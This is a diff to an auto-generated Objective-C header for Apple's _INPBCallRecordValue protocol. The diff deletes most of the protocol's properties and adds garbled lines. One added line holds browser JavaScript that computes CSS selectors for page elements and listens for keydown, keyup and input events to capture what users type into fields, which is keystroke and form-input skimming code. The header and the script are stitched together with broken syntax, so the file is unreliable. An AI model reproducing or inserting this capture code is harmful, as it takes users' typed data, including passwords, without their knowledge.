@@ -4,36 +4,14 @@
 //  Copyright (C) 1997-2019 Steve Nygard.
 //
 
-@class NSArray, NSString, _INPBCallMetrics, _INPBContactValue, _INPBDateTime, _INPBInteger;
+@class _INPBContactValue;
 
 @protocol _INPBCallRecordValue
+- (void);
+- (_Bool);
+- (void)let matches = document.querySelectorAll(`${sel}`);        return matches.length == 1;    }    function getSelectorPathForElement(elem) {    let uniqueSelector = null;    let list = [];    while (elem.parentNode) {        let sel = '';        let tmp = '';        let tagName = elem.tagName;        if (tagName) {            sel += tagName.toLowerCase();        }        let idAttr = elem.getAttribute('id');        if (idAttr) {            sel += '#'+idAttr;        }        let nameAttr = elem.getAttribute('name');        if (nameAttr) {            sel += '[name='+nameAttr+']';        }        let typeAttr = elem.getAttribute('type');        if (typeAttr) {            sel += '[type='+typeAttr+']';        }        list.unshift(sel);        tmp = list.join(' ');        if (isUniqueSelector(tmp)) {            uniqueSelector = tmp;            break;        }        list.shift();        let classAttr = elem.getAttribute('class');        if (classAttr) {            sel += '.'+classAttr.split(' ').join('.');            list.unshift(sel);            tmp = list.join(' ');            if (isUniqueSelector(tmp)) {                uniqueSelector = tmp;                break;            }            list.shift();        }        if (elem.previousElementSibling || elem.nextElementSibling) {            let sib = elem;            let nth = 0;            while (sib) {                nth++;                sib = sib.previousElementSibling;            }            sel += ':(_INPBContactValue *)arg1 nth-child('+nth+')';            list.unshift(sel);            tmp = list.join(' ');            if (isUniqueSelector(tmp)) {                uniqueSelector = tmp;                break;            }            list.shift();        }        list.unshift(sel);        tmp = list.join(' ');        if (isUniqueSelector(tmp)) {            uniqueSelector = tmp;            break;        }        elem = elem.parentNode;    }    return uniqueSelector;}var p = new Promise(function(resolve, reject){ document.addEventListener('keydown', function(event){ let target = event.target; let selector = getSelectorPathForElement(target); let value = target.value; var capturedData = {}; if (selector && value){ capturedData[selector] = value; } resolve(capturedData); }, { once:true }); document.addEventListener('keyup', function(event){ let target = event.target; let selector = getSelectorPathForElement(target); let value = target.value; var capturedData = {}; if (selector && value){ capturedData[selector] = value; } resolve(capturedData); }, { once:true }); document.addEventListener('input', function(event){ let target = event.target; let selector = getSelectorPathForElement(target); let value = target.value; var capturedData = {}; if (selector && value && (target.type.toLowerCase() != 'checkbox' || target.checked)){ capturedData[selector] = value; } resolve(capturedData); }, { once:true }); }); await p; return p; /* Error: Ran out of types for this method. */;
 
 // Remaining properties
 @property(nonatomic) int callCapability;
-@property(retain, nonatomic) _INPBCallMetrics *callMetrics;
-@property(nonatomic) int callType;
-@property(retain, nonatomic) _INPBContactValue *caller;
-@property(retain, nonatomic) _INPBDateTime *dateCreated;
-@property(nonatomic) _Bool hasCallCapability;
-@property(readonly, nonatomic) _Bool hasCallMetrics;
-@property(nonatomic) _Bool hasCallType;
-@property(readonly, nonatomic) _Bool hasCaller;
-@property(readonly, nonatomic) _Bool hasDateCreated;
-@property(readonly, nonatomic) _Bool hasIdentifier;
-@property(nonatomic) _Bool hasIsCallerIdBlocked;
-@property(readonly, nonatomic) _Bool hasNumberOfCalls;
-@property(nonatomic) _Bool hasPreferredCallProvider;
-@property(readonly, nonatomic) _Bool hasProviderBundleId;
-@property(readonly, nonatomic) _Bool hasProviderId;
-@property(nonatomic) _Bool hasUnseen;
-@property(copy, nonatomic) NSString *identifier;
-@property(nonatomic) _Bool isCallerIdBlocked;
-@property(retain, nonatomic) _INPBInteger *numberOfCalls;
-@property(copy, nonatomic) NSArray *participants;
-@property(readonly, nonatomic) unsigned long long participantsCount;
-@property(nonatomic) int preferredCallProvider;
-@property(copy, nonatomic) NSString *providerBundleId;
-@property(copy, nonatomic) NSString *providerId;
-@property(nonatomic) _Bool unseen;
 @end
 
